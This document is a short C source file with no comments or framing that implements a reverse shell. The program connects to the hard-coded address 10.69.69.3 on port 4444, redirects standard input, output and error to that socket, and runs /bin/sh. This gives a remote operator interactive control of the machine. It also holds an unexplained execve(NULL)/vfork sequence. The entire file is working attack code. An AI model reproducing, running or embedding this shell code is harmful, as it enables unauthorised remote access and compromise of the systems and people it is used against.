#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>

#define ADDR "10.69.69.3"
#define PORT 4444

int main()
{ 
	int fd;
	struct sockaddr_in addr;
        
	fd = socket(PF_INET, SOCK_STREAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = inet_addr(ADDR);
	memset(addr.sin_zero, 0, sizeof(addr.sin_zero));

	connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr));
	dup2(fd, 0); 
	dup2(fd, 1); 
	dup2(fd, 2);
	
	if(execve(NULL, NULL, NULL) < 0 && errno == ENOTSUP)
	{
		vfork();
	}	

	execl("/bin/sh", NULL, NULL);
        
	close(fd);

	return 0;
}

